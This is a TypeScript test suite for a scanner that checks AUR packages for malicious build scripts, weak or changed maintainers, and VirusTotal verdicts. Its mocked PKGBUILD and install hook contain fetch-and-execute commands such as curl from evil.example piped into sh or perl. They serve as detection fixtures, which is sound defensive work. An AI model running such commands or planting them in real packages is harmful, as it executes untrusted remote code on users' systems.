import type { AurPackageScan, VtIndicatorReport } from '@chaotic-next/shared-lib';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { AurScanService } from './aur-scan.service';
import { DiffScanService } from './diff-scan.service';
import type { ScanIndicator } from './indicators';

const PKGBUILD = [
  'pkgname=evilpkg',
  'source=("https://evil.example/payload.sh" "helper.install")',
  'sha256sums=(' + 'a'.repeat(64) + ' SKIP)',
  'build() {',
  '  curl -s https://evil.example/payload.sh | sh',
  '}',
].join('\n');

const HELPER_INSTALL = 'post_install() {\n  curl https://evil.example/dl.pl | perl\n}\n';

function textResponse(body: string): Response {
  return new Response(body, { status: 200, headers: { 'content-type': 'text/plain' } });
}

const DAY_SECONDS = 24 * 60 * 60;
const NOW_SECONDS = Math.floor(Date.now() / 1000);
const NOVICE_AGE_DAYS = 60;
const ESTABLISHED_AGE_DAYS = 5 * 365;

function aurFetchMock(): ReturnType<typeof vi.fn> {
  return vi.fn(async (url: string) => {
    if (url.includes('rpc/v5/info')) {
      const requested = [...url.matchAll(/arg\[]=([^&]+)/g)].map((match) => decodeURIComponent(match[1]));
      const results = requested
        .filter((name) => name === 'evilpkg')
        .map((name) => ({
          Name: name,
          PackageBase: 'evilpkg',
          Maintainer: 'newmaintainer',
          CoMaintainers: ['oldmaintainer'],
          NumVotes: 3,
          Popularity: 0.5,
          FirstSubmitted: NOW_SECONDS - 30 * DAY_SECONDS,
        }));
      return new Response(JSON.stringify({ results }), { headers: { 'content-type': 'application/json' } });
    }
    if (url.includes('by=maintainer')) {
      const username = decodeURIComponent(url.split('arg=')[1] ?? '');
      const old = username === 'oldmaintainer';
      const firstSubmitted = NOW_SECONDS - (old ? ESTABLISHED_AGE_DAYS : NOVICE_AGE_DAYS) * DAY_SECONDS;
      return new Response(
        JSON.stringify({
          results: [
            { Name: `${username}-pkg1`, FirstSubmitted: firstSubmitted, NumVotes: old ? 500 : 0 },
            { Name: `${username}-pkg2`, FirstSubmitted: NOW_SECONDS - DAY_SECONDS, NumVotes: old ? 120 : 1 },
          ],
        }),
        { headers: { 'content-type': 'application/json' } },
      );
    }
    if (url.endsWith('/PKGBUILD?h=evilpkg')) return textResponse(PKGBUILD);
    if (url.includes('/cgit/aur.git/tree/sub/'))
      return textResponse(
        [
          '<html><body>',
          "<a class='ls-blob' href='/cgit/aur.git/tree/sub/deep.conf?h=evilpkg'>deep.conf</a>",
          '</body></html>',
        ].join('\n'),
      );
    if (url.includes('/cgit/aur.git/tree/'))
      return textResponse(
        [
          '<html><body>',
          "<a class='active' href='/cgit/aur.git/tree/?h=evilpkg'>..</a>",
          "<a class='ls-blob SRCINFO' href='/cgit/aur.git/tree/.SRCINFO?h=evilpkg'>.SRCINFO</a>",
          "<a class='ls-blob' href='/cgit/aur.git/tree/PKGBUILD?h=evilpkg'>PKGBUILD</a>",
          "<a class='ls-blob install' href='/cgit/aur.git/tree/helper.install?h=evilpkg'>helper.install</a>",
          "<a class='ls-blob' href='/cgit/aur.git/tree/payload.sh?h=evilpkg'>payload.sh</a>",
          "<a class='ls-tree dir' href='/cgit/aur.git/tree/sub/?h=evilpkg'>sub/</a>",
          "<a class='ls-blob' href='/cgit/aur.git/tree/blob.bin?h=evilpkg'>blob.bin</a>",
          '</body></html>',
        ].join('\n'),
      );
    if (url.includes('helper.install')) return textResponse(HELPER_INSTALL);
    if (url.includes('payload.sh')) return textResponse('#!/bin/sh\nid > /tmp/pwned\n');
    if (url.includes('.SRCINFO')) return textResponse('pkgbase = evilpkg\npkgname = evilpkg\n');
    if (url.includes('deep.conf')) return textResponse('key=value\n');
    if (url.includes('blob.bin')) return new Response(new Uint8Array([0x00, 0x01, 0x02, 0x00]), { status: 200 });
    return new Response('not found', { status: 404 });
  });
}

function snapshotRepositoryMock() {
  const rows = new Map<string, { packageName: string; maintainers: string[] }>();
  return {
    findOne: vi.fn(async ({ where }: { where: { packageName: string } }) => rows.get(where.packageName) ?? null),
    upsert: vi.fn(async (entity: { packageName: string; maintainers: string[] }) => {
      rows.set(entity.packageName, entity);
    }),
    rows,
  };
}

function makeService(
  enabled = false,
  reportOn?: (indicators: ScanIndicator[]) => Promise<VtIndicatorReport[]>,
  snapshotRepository?: object,
) {
  const fetchMock = aurFetchMock();
  vi.stubGlobal('fetch', fetchMock);
  const diffScanService = new DiffScanService();
  const virustotalService = {
    enabled,
    reportOn: reportOn ?? vi.fn(async () => [] as VtIndicatorReport[]),
  };
  const aurAuthService = {
    getMaintainerRegistrationDate: vi.fn(async () => null),
  };
  const service = new AurScanService(
    diffScanService,
    virustotalService as never,
    aurAuthService as never,
    snapshotRepository as never | undefined,
  );
  return { service, virustotalService, fetchMock };
}

describe('AurScanService', () => {
  afterEach(() => {
    vi.unstubAllGlobals();
  });

  it('scans the PKGBUILD and scannable sources with the rule catalog', async () => {
    const { service } = makeService();

    const scan = await service.startScan('evilpkg');

    expect(scan.status).toBe('done');
    expect(scan.packageBase).toBe('evilpkg');
    expect(scan.scannedFiles).toEqual(['PKGBUILD', '.SRCINFO', 'helper.install', 'payload.sh', 'sub/deep.conf']);
    expect(scan.sourceFiles?.map((file) => file.name)).toEqual([
      'PKGBUILD',
      '.SRCINFO',
      'helper.install',
      'payload.sh',
      'sub/deep.conf',
    ]);
    expect(scan.skippedBinaryFiles).toEqual(['blob.bin']);
    expect(scan.findings.map((finding) => finding.ruleId)).toContain('CAUR-INSTALL-NEW');
    expect(scan.findings.length).toBeGreaterThan(0);
    expect(scan.findings.some((finding) => finding.file === 'PKGBUILD')).toBe(true);
    // The source viewer flags lines by number, so findings must carry one.
    const pkgFinding = scan.findings.find((finding) => finding.file === 'PKGBUILD');
    expect(pkgFinding?.line).toBeGreaterThan(0);
    expect(scan.findings.some((finding) => finding.file === 'helper.install')).toBe(true);
    expect(scan.vtPending).toBe(0);
  });

  it('marks VirusTotal reports pending and exposes them once resolved', async () => {
    let releaseVt: ((reports: VtIndicatorReport[]) => void) | undefined;
    const pending = new Promise<VtIndicatorReport[]>((resolve) => {
      releaseVt = resolve;
    });
    const reportOn = vi.fn(() => pending);
    const { service } = makeService(true, reportOn);

    const scan = await service.startScan('evilpkg', { withVirusTotal: true });
    expect(scan.status).toBe('awaiting-vt');
    expect(scan.vtPending).toBeGreaterThan(0);

    releaseVt?.([
      { type: 'url', value: 'https://evil.example/payload.sh', context: 'PKGBUILD (source)', verdict: 'malicious' },
    ]);
    await vi.waitFor(() => {
      expect(service.getScan('evilpkg')?.status).toBe('done');
    });
    const stored = service.getScan('evilpkg') as AurPackageScan;
    expect(stored.vtReports).toHaveLength(1);
    expect(stored.vtReports[0].verdict).toBe('malicious');
    expect(stored.vtPending).toBe(0);
  });

  it('skips VirusTotal when the session-derived flag disables it', async () => {
    const reportOn = vi.fn(async () => [] as VtIndicatorReport[]);
    const { service } = makeService(true, reportOn);

    const scan = await service.startScan('evilpkg', { withVirusTotal: false });

    expect(scan.status).toBe('done');
    expect(scan.vtPending).toBe(0);
    expect(reportOn).not.toHaveBeenCalled();
  });

  it('ships all repo-tree text files including .SRCINFO and reports skipped binaries', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn(async (url: string) => {
        if (url.includes('rpc/v5/info'))
          return new Response(
            JSON.stringify({ results: [{ Name: 'metapkg', PackageBase: 'metapkg', FirstSubmitted: NOW_SECONDS }] }),
            { headers: { 'content-type': 'application/json' } },
          );
        if (url.includes('by=maintainer'))
          return new Response(JSON.stringify({ results: [] }), { headers: { 'content-type': 'application/json' } });
        if (url.includes('/cgit/aur.git/tree/'))
          return textResponse(
            [
              '<html><body>',
              '<a href="/cgit/aur.git/tree/PKGBUILD?h=metapkg">PKGBUILD</a>',
              '<a href="/cgit/aur.git/tree/data.txt?h=metapkg">data.txt</a>',
              '<a href="/cgit/aur.git/tree/.SRCINFO?h=metapkg">.SRCINFO</a>',
              '<a href="/cgit/aur.git/tree/blob.tar.xz?h=metapkg">blob.tar.xz</a>',
              '</body></html>',
            ].join('\n'),
          );
        if (url.endsWith('/PKGBUILD?h=metapkg')) return textResponse('pkgname=metapkg\n');
        if (url.includes('data.txt')) return textResponse('hello\n');
        if (url.includes('.SRCINFO')) return textResponse('pkgbase = metapkg\n');
        if (url.includes('blob.tar.xz')) return new Response(new Uint8Array([0x00, 0x50, 0x4b, 0x00]), { status: 200 });
        return new Response('not found', { status: 404 });
      }),
    );
    const service = new AurScanService(
      new DiffScanService(),
      { enabled: false } as never,
      { getMaintainerRegistrationDate: vi.fn(async () => null) } as never,
    );

    const scan = await service.startScan('metapkg');

    expect(scan.status, `scan failed: ${scan.error ?? 'no error'}`).toBe('done');
    expect(scan.sourceFiles?.map((file) => file.name)).toEqual(['PKGBUILD', 'data.txt', '.SRCINFO']);
    expect(scan.skippedBinaryFiles).toEqual(['blob.tar.xz']);
  });

  it('fails with a speaking error for unknown packages', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn(async (url: string) =>
        url.includes('rpc/v5/info')
          ? new Response(JSON.stringify({ results: [] }), { headers: { 'content-type': 'application/json' } })
          : new Response('not found', { status: 404 }),
      ),
    );
    const service = new AurScanService(
      new DiffScanService(),
      { enabled: false } as never,
      { getMaintainerRegistrationDate: vi.fn(async () => null) } as never,
    );

    const scan = await service.startScan('doesnotexist');

    expect(scan.status).toBe('failed');
    expect(scan.error).toContain('No AUR package');
  });

  it('keeps the most recent scans queryable by name', async () => {
    const { service } = makeService();

    await service.startScan('evilpkg');

    expect(service.getScan('EVILPKG')?.packageName).toBe('evilpkg');
    expect(service.getScan('other')).toBeNull();
  });

  it('profiles maintainers and flags the novice one', async () => {
    const { service } = makeService();

    const scan = await service.startScan('evilpkg');

    expect(scan.packageMeta.orphaned).toBe(false);
    expect(scan.packageMeta.votes).toBe(3);
    expect(scan.maintainers).toHaveLength(2);

    const novice = scan.maintainers.find((maintainer) => maintainer.username === 'newmaintainer');
    expect(novice?.packagesMaintained).toBe(2);
    expect(novice?.totalVotes).toBe(1);
    expect(novice?.novice).toBe(true);

    const established = scan.maintainers.find((maintainer) => maintainer.username === 'oldmaintainer');
    expect(established?.totalVotes).toBe(620);
    expect(established?.novice).toBe(false);
  });

  it('marks orphaned packages when the AUR lists no maintainer', async () => {
    vi.stubGlobal(
      'fetch',
      vi.fn(async (url: string) => {
        if (url.includes('rpc/v5/info')) {
          return new Response(
            JSON.stringify({
              results: [{ Name: 'orphanpkg', PackageBase: 'orphanpkg', Maintainer: null, FirstSubmitted: NOW_SECONDS }],
            }),
            { headers: { 'content-type': 'application/json' } },
          );
        }
        if (url.endsWith('/PKGBUILD?h=orphanpkg')) return textResponse('pkgname=orphanpkg\n');
        return new Response('not found', { status: 404 });
      }),
    );
    const service = new AurScanService(
      new DiffScanService(),
      { enabled: false } as never,
      { getMaintainerRegistrationDate: vi.fn(async () => null) } as never,
    );

    const scan = await service.startScan('orphanpkg');

    expect(scan.packageMeta.orphaned).toBe(true);
    expect(scan.maintainers).toEqual([]);
  });

  it('batches concurrent package info lookups into one multiinfo request', async () => {
    const { service, fetchMock } = makeService();

    await Promise.all([service.startScan('evilpkg'), service.startScan('otherpkg')]);

    const infoCalls = fetchMock.mock.calls.filter(([url]) => url.includes('rpc/v5/info'));
    expect(infoCalls).toHaveLength(1);
    expect(infoCalls[0][0]).toContain('arg[]=evilpkg');
    expect(infoCalls[0][0]).toContain('arg[]=otherpkg');
  });

  it('answers maintainer statuses for many packages from one request', async () => {
    const { service, fetchMock } = makeService();

    const statuses = await service.maintainerStatusFor(['evilpkg', 'unknownpkg']);

    expect(statuses.size).toBe(1);
    expect(statuses.get('evilpkg')?.maintainers.map((m) => m.username)).toEqual(['newmaintainer', 'oldmaintainer']);
    const infoCalls = fetchMock.mock.calls.filter(([url]) => url.includes('rpc/v5/info'));
    expect(infoCalls).toHaveLength(1);
    expect(infoCalls[0][0]).toContain('arg[]=evilpkg');
    expect(infoCalls[0][0]).toContain('arg[]=unknownpkg');
  });

  it('reuses cached maintainer profiles across scans', async () => {
    const { service, fetchMock } = makeService();

    await service.startScan('evilpkg');
    await service.startScan('evilpkg');

    const searchCalls = fetchMock.mock.calls.filter(([url]) => url.includes('by=maintainer'));
    expect(searchCalls).toHaveLength(2);
  });

  it('detects a maintainer takeover against the stored snapshot', async () => {
    const snapshots = snapshotRepositoryMock();
    const { service } = makeService(false, undefined, snapshots);

    const first = await service.maintainerStatusOf('evilpkg');
    expect(first?.change).toBeNull();
    expect(snapshots.rows.get('evilpkg')?.maintainers).toEqual(['newmaintainer', 'oldmaintainer']);

    const takeoverFetch = vi.fn(async (url: string) => {
      if (url.includes('rpc/v5/info')) {
        return new Response(
          JSON.stringify({
            results: [
              {
                Name: 'evilpkg',
                PackageBase: 'evilpkg',
                Maintainer: 'stranger',
                FirstSubmitted: NOW_SECONDS - 10 * DAY_SECONDS,
              },
            ],
          }),
          { headers: { 'content-type': 'application/json' } },
        );
      }
      return new Response(JSON.stringify({ results: [] }), { headers: { 'content-type': 'application/json' } });
    });
    vi.stubGlobal('fetch', takeoverFetch);
    service.clearAurCache();

    const second = await service.maintainerStatusOf('evilpkg');
    expect(second?.change?.added).toEqual(['stranger']);
    expect(second?.change?.removed).toEqual(['newmaintainer', 'oldmaintainer']);
    expect(second?.maintainers).toHaveLength(1);
    expect(second?.maintainers[0]?.username).toBe('stranger');
    expect(second?.maintainers[0]?.novice).toBe(true);

    const third = await service.maintainerStatusOf('evilpkg');
    expect(third?.change).toBeNull();
    expect(snapshots.rows.get('evilpkg')?.maintainers).toEqual(['stranger']);
  });

  it('streams scan updates and completes on the terminal message', async () => {
    let releaseVt: ((reports: VtIndicatorReport[]) => void) | undefined;
    const pending = new Promise<VtIndicatorReport[]>((resolve) => {
      releaseVt = resolve;
    });
    const { service } = makeService(true, () => pending);

    const scan = await service.startScan('evilpkg', { withVirusTotal: true });
    expect(scan.status).toBe('awaiting-vt');

    const chunks: { complete: boolean; status: string }[] = [];
    const streamDone = new Promise<void>((resolve) => {
      service.streamScan('evilpkg').subscribe({
        next: (message) => {
          if (!message.data || typeof message.data === 'string') return;
          chunks.push({ complete: message.data.complete, status: message.data.scan.status });
        },
        complete: () => resolve(),
      });
    });

    expect(chunks).toEqual([{ complete: false, status: 'awaiting-vt' }]);

    releaseVt?.([{ type: 'url', value: 'https://evil.example/x', context: 'PKGBUILD', verdict: 'clean' }]);
    await streamDone;
    expect(chunks[chunks.length - 1]).toEqual({ complete: true, status: 'done' });
  });

  it('streams a settled scan as a single complete message', async () => {
    const { service } = makeService();

    await service.startScan('evilpkg');

    const chunks: boolean[] = [];
    await new Promise<void>((resolve) => {
      service.streamScan('evilpkg').subscribe({
        next: (message) => {
          if (message.data && typeof message.data !== 'string') chunks.push(message.data.complete);
        },
        complete: () => resolve(),
      });
    });
    expect(chunks).toEqual([true]);
  });

  it('refuses to stream scans that were never started', () => {
    const { service } = makeService();

    expect(() => service.streamScan('unknown')).toThrow('No scan recorded');
  });
});
